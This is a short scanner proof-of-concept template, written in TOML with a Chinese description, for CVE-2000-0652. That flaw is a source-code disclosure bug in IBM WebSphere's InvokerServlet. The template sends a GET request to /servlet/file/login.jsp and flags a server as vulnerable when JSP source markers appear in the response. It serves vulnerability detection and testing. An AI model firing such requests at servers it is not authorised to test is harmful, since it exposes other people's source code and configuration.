[info]
author = "ave"
description = "IBM WebSphere Application Server 2.0/3.0/3.0.2.1 存在 InvokerServlet 源代码泄露漏洞。远程攻击者通过向 /servlet/file/ 路径发送 GET 请求，可读取 JSP/Servlet 等可执行 Web 文件的源代码，导致敏感业务逻辑和配置信息泄露。"
id = "POC-AVE-2000-0503"
name = "IBM WebSphere Application Server 源代码泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0503"]
vuln_id = [
    "CVE-2000-0652",
    "AVE-2000-0503",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/file/login.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%@",
    "<%",
    "out.println",
    "java.io",
]
